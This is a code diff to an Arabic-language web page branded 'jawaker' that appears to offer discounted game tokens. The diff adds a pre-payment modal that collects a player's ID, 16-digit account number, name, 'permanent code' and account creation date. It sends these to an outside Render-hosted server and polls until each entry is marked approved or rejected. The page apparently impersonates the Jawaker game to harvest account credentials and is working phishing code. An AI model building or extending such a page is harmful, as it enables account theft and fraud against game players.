@@ -176,14 +176,15 @@
     background: linear-gradient(180deg, #38c264, var(--green-dark));
     color:#fff;
     border:none;
-    padding: 13px 0;
+    padding: 13px 8px;
     border-radius: 12px;
     font-family:'Cairo', sans-serif;
-    font-weight:800;
-    font-size: 16px;
-    letter-spacing: 0.5px;
+    font-weight:700;
+    font-size: 13.5px;
+    letter-spacing: 0.2px;
     cursor:pointer;
     box-shadow: 0 4px 0 rgba(0,0,0,0.3);
+    direction: ltr;
   }
   .buy-btn:active{ transform: translateY(2px); box-shadow: 0 2px 0 rgba(0,0,0,0.3); }
 
@@ -197,21 +198,140 @@
     color: var(--text-dim);
     font-size: 13px;
   }
+
+  /* Payment info form modal */
+  .overlay{
+    position:fixed;
+    inset:0;
+    background: rgba(0,0,0,0.72);
+    display:none;
+    align-items:flex-start;
+    justify-content:center;
+    padding: 40px 16px;
+    overflow-y:auto;
+    z-index: 100;
+  }
+  .overlay.open{ display:flex; }
+  .form-panel{
+    background: var(--bg-alt);
+    border: 1px solid var(--card-border);
+    border-radius: 20px;
+    width: 100%;
+    max-width: 460px;
+    padding: 26px 22px 24px;
+    position:relative;
+  }
+  .form-panel .close-btn{
+    position:absolute;
+    top:16px;
+    left:16px;
+    width:30px;
+    height:30px;
+    border-radius:50%;
+    background:#2a2d34;
+    border:none;
+    color: var(--text-dim);
+    font-size:16px;
+    cursor:pointer;
+  }
+  .form-title{
+    font-family:'Cairo', sans-serif;
+    font-weight:800;
+    font-size: 19px;
+    margin-bottom: 4px;
+    color: var(--text);
+  }
+  .form-sub{
+    color: var(--text-dim);
+    font-size: 13.5px;
+    margin-bottom: 20px;
+  }
+  .field{
+    margin-bottom: 16px;
+    text-align:right;
+  }
+  .field input{
+    width:100%;
+    background: #101216;
+    border: 1.5px solid var(--card-border);
+    border-radius: 10px;
+    padding: 12px 14px;
+    color: var(--text);
+    font-family:'Tajawal', sans-serif;
+    font-size: 14.5px;
+    outline:none;
+    transition: border-color .15s ease;
+  }
+  .field input:focus{ border-color: var(--violet); }
+  .field .hint{
+    font-size: 12px;
+    color: var(--text-dim);
+    margin-top:5px;
+  }
+  .submit-btn{
+    width:100%;
+    margin-top: 8px;
+    padding: 14px 0;
+    border-radius: 12px;
+    border:none;
+    font-family:'Cairo', sans-serif;
+    font-weight:800;
+    font-size: 15.5px;
+    cursor:not-allowed;
+    background: linear-gradient(180deg, #b9bcc2, #8b8e94);
+    color: #4a4c50;
+    transition: all .2s ease;
+  }
+  .submit-btn.enabled{
+    cursor:pointer;
+    background: linear-gradient(180deg, #4a90f0, #2f68c9);
+    color:#fff;
+    box-shadow: 0 4px 0 rgba(0,0,0,0.3);
+  }
+
+  /* Status view: waiting / approved / rejected */
+  .status-view{
+    display:none;
+    flex-direction:column;
+    align-items:center;
+    text-align:center;
+    padding: 20px 6px 6px;
+  }
+  .status-view.show{ display:flex; }
+  .spinner{
+    width:44px;
+    height:44px;
+    border-radius:50%;
+    border: 4px solid #2a2d34;
+    border-top-color: var(--violet);
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 18px;
+  }
+  @keyframes spin{ to{ transform: rotate(360deg); } }
+  .status-icon{
+    font-size: 40px;
+    margin-bottom: 14px;
+  }
+  .status-text{
+    font-family:'Cairo', sans-serif;
+    font-weight:700;
+    font-size: 16px;
+    line-height:1.6;
+    color: var(--text);
+    margin-bottom: 20px;
+  }
 </style>
 </head>
 <body>
 
 <header>
-  <button class="login-btn">تسجيل الدخول</button>
-  <div class="brand">اسم متجرك <span class="dot">●</span></div>
+  <div style="width:40px"></div>
+  <div class="brand">jawaker <span class="dot">●</span></div>
   <div class="menu-icon"><i></i><i></i><i></i></div>
 </header>
 
 <nav class="tabs">
   <button class="tab active">توكنز</button>
-  <button class="tab">الحزم</button>
-  <button class="tab">مجاني</button>
-  <button class="tab">عروض الأسبوع</button>
 </nav>
 
 <main>
@@ -220,9 +340,48 @@
 </main>
 
 <footer>
-  <span>اسم متجرك</span>
+  <span>jawaker</span>
   <span>© 2026 جميع الحقوق محفوظة</span>
 </footer>
+
+<div class="overlay" id="overlay">
+  <div class="form-panel">
+    <button class="close-btn" onclick="closeForm()">✕</button>
+    <div class="form-title">أكمل بياناتك</div>
+    <div class="form-sub">عبّي المعلومات التالية قبل إتمام الدفع</div>
+
+    <form id="payForm" novalidate>
+      <div class="field">
+        <input type="text" id="f-id" name="id" placeholder="ID" required>
+      </div>
+
+      <div class="field">
+        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" maxlength="16" pattern="\d{16}" placeholder="رقمك في جواكر (16 رقم)" required>
+      </div>
+
+      <div class="field">
+        <input type="text" id="f-jawaker-name" name="jawakerName" placeholder="اسمك في جواكر" required>
+      </div>
+
+      <div class="field">
+        <input type="text" id="f-perm-code" name="permCode" inputmode="numeric" pattern="\d+" placeholder="رمزك الدائم (أرقام فقط)" required>
+      </div>
+
+      <div class="field">
+        <input type="text" id="f-account-date" name="accountDate" inputmode="numeric" pattern="(0[1-9]|1[0-2])/\d{4}" placeholder="تاريخ إنشاء الحساب (شهر/سنة) مثال: 05/2022" required>
+      </div>
+
+      <button type="submit" class="submit-btn" id="submitBtn" disabled>إرسال</button>
+    </form>
+
+    <div class="status-view" id="statusView">
+      <div id="statusSpinnerWrap"><div class="spinner"></div></div>
+      <div class="status-icon" id="statusIcon" style="display:none"></div>
+      <div class="status-text" id="statusText">يرجى الانتظار قليلاً...</div>
+      <button class="submit-btn" id="statusActionBtn" style="display:none"></button>
+    </div>
+  </div>
+</div>
 
 <script>
   const coinSVG = `
@@ -240,14 +399,14 @@
   </svg>`;
 
   const packages = [
-    { name: "قطع من التوكنز", amount: "19,000", price: "USD 3" },
-    { name: "كمشة من التوكنز", amount: "34,000", price: "USD 5" },
-    { name: "حزمة من التوكنز", amount: "50,000", price: "USD 7" },
-    { name: "كومة من التوكنز", amount: "105,000", price: "USD 14" },
-    { name: "رزمة من التوكنز", amount: "240,000", price: "USD 30" },
-    { name: "كيس من التوكنز", amount: "410,000", price: "USD 50" },
-    { name: "حقيبة من التوكنز", amount: "830,000", price: "USD 100" },
-    { name: "صندوق من التوكنز", amount: "1,000,000", price: "USD 115" },
+    { name: "الفئة الأولى", amount: "100,000", price: "$10" },
+    { name: "الفئة الثانية", amount: "220,000", price: "$20" },
+    { name: "الفئة الثالثة", amount: "330,000", price: "$30" },
+    { name: "الفئة الرابعة", amount: "660,000", price: "$60" },
+    { name: "الفئة الخامسة", amount: "850,000", price: "$75" },
+    { name: "الفئة السادسة", amount: "1,100,000", price: "$90" },
+    { name: "الفئة السابعة", amount: "2,200,000", price: "$170" },
+    { name: "الفئة الثامنة", amount: "3,300,000", price: "$250" },
   ];
 
   const grid = document.getElementById('grid');
@@ -259,9 +418,181 @@
       <div class="coin-icon">${coinSVG}</div>
       <div class="pack-name">${p.name}</div>
       <div class="pack-amount">${p.amount} <span class="mini-coin">${coinSVG}</span></div>
-      <button class="buy-btn">${p.price}</button>
+      <button class="buy-btn" data-state="price" data-name="${p.name}" data-amount="${p.amount}" data-price="${p.price}" onclick="handleBuy(this)">${p.price}</button>
     `;
     grid.appendChild(card);
+  });
+
+  function handleBuy(btn){
+    if(btn.dataset.state === 'price'){
+      // First click: reveal the payment option
+      btn.textContent = 'Pay with Credit Card';
+      btn.dataset.state = 'pay';
+      return;
+    }
+    // Second click: open the pre-payment info form
+    currentOrder = {
+      name: btn.dataset.name,
+      amount: btn.dataset.amount,
+      price: btn.dataset.price
+    };
+    openForm();
+  }
+
+  // ---- Backend config ----
+  // بعد ما تنشري السيرفر (app.py) على Render/Railway/إلخ، حطي رابطه هون:
+  const BACKEND_URL = "https://jawaker.onrender.com";
+
+  let currentOrder = null;
+  let pollTimer = null;
+
+  // ---- Pre-payment form logic ----
+  const overlay = document.getElementById('overlay');
+  const payForm = document.getElementById('payForm');
+  const submitBtn = document.getElementById('submitBtn');
+  const formInputs = payForm.querySelectorAll('input[required]');
+  const statusView = document.getElementById('statusView');
+  const statusSpinnerWrap = document.getElementById('statusSpinnerWrap');
+  const statusIcon = document.getElementById('statusIcon');
+  const statusText = document.getElementById('statusText');
+  const statusActionBtn = document.getElementById('statusActionBtn');
+
+  function openForm(){
+    overlay.classList.add('open');
+  }
+  function closeForm(){
+    overlay.classList.remove('open');
+    stopPolling();
+    // Reset views for next time
+    payForm.style.display = '';
+    statusView.classList.remove('show');
+    payForm.reset();
+    submitBtn.disabled = true;
+    submitBtn.classList.remove('enabled');
+    submitBtn.textContent = 'إرسال';
+  }
+  overlay.addEventListener('click', (e) => {
+    if(e.target === overlay) closeForm();
+  });
+
+  function validateForm(){
+    let allValid = true;
+    formInputs.forEach(input => {
+      if(!input.checkValidity() || input.value.trim() === ''){
+        allValid = false;
+      }
+    });
+    submitBtn.disabled = !allValid;
+    submitBtn.classList.toggle('enabled', allValid);
+  }
+
+  formInputs.forEach(input => {
+    input.addEventListener('input', validateForm);
+  });
+
+  function showWaiting(){
+    payForm.style.display = 'none';
+    statusView.classList.add('show');
+    statusSpinnerWrap.style.display = '';
+    statusIcon.style.display = 'none';
+    statusText.textContent = 'يرجى الانتظار قليلاً...';
+    statusActionBtn.style.display = 'none';
+  }
+
+  function showApproved(){
+    statusSpinnerWrap.style.display = 'none';
+    statusIcon.style.display = '';
+    statusIcon.textContent = '✅';
+    statusText.textContent = 'تم شحن حسابك بنجاح';
+    statusActionBtn.textContent = 'حسناً';
+    statusActionBtn.className = 'submit-btn enabled';
+    statusActionBtn.style.display = '';
+    statusActionBtn.onclick = closeForm;
+  }
+
+  function showRejected(){
+    statusSpinnerWrap.style.display = 'none';
+    statusIcon.style.display = '';
+    statusIcon.textContent = '⚠️';
+    statusText.textContent = 'يرجى التأكد من صحة بياناتك';
+    statusActionBtn.textContent = 'حاول مرة أخرى';
+    statusActionBtn.className = 'submit-btn enabled';
+    statusActionBtn.style.display = '';
+    statusActionBtn.onclick = function(){
+      statusView.classList.remove('show');
+      payForm.style.display = '';
+    };
+  }
+
+  function showError(msg){
+    statusSpinnerWrap.style.display = 'none';
+    statusIcon.style.display = '';
+    statusIcon.textContent = '⚠️';
+    statusText.textContent = msg || 'صار في مشكلة، حاول مرة أخرى';
+    statusActionBtn.textContent = 'إغلاق';
+    statusActionBtn.className = 'submit-btn enabled';
+    statusActionBtn.style.display = '';
+    statusActionBtn.onclick = closeForm;
+  }
+
+  function stopPolling(){
+    if(pollTimer){ clearInterval(pollTimer); pollTimer = null; }
+  }
+
+  function pollOrderStatus(orderId){
+    pollTimer = setInterval(async () => {
+      try{
+        const res = await fetch(`${BACKEND_URL}/api/order/${orderId}`);
+        if(!res.ok) return;
+        const result = await res.json();
+        if(result.status === 'approved'){
+          stopPolling();
+          showApproved();
+        } else if(result.status === 'rejected'){
+          stopPolling();
+          showRejected();
+        }
+        // status === 'pending' -> keep waiting
+      } catch(err){
+        // شبكة متقطعة، منكمل نحاول
+      }
+    }, 2500);
+  }
+
+  payForm.addEventListener('submit', async function(e){
+    e.preventDefault();
+    validateForm();
+    if(submitBtn.disabled) return;
+
+    const data = new FormData(payForm);
+    const body = {
+      id: data.get('id'),
+      jawakerNumber: data.get('jawakerNumber'),
+      jawakerName: data.get('jawakerName'),
+      permCode: data.get('permCode'),
+      accountDate: data.get('accountDate'),
+      order: currentOrder || {},
+    };
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'جارِ الإرسال...';
+
+    try{
+      const res = await fetch(`${BACKEND_URL}/api/order`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body),
+      });
+      const result = await res.json();
+      if(!res.ok || !result.order_id){
+        throw new Error(result.error || 'فشل إرسال الطلب');
+      }
+      showWaiting();
+      pollOrderStatus(result.order_id);
+    } catch(err){
+      showWaiting();
+      showError('صار في مشكلة بإرسال البيانات: ' + err.message);
+    }
   });
 </script>
 
